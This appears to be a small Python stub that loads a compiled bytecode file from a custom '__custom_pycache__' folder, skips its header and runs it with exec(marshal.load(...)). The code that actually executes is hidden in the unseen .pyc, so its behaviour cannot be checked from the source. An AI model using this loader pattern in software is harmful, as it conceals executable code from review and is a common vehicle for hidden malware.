
import marshal
import os

s = open(os.path.join(os.path.dirname(os.path.realpath(__file__)), '__custom_pycache__', 'dataclass_75d6348cfb454da78f8c25f383d939ea.cpython-xxx.pyc'), 'rb')
s.seek(16)
exec(marshal.load(s))
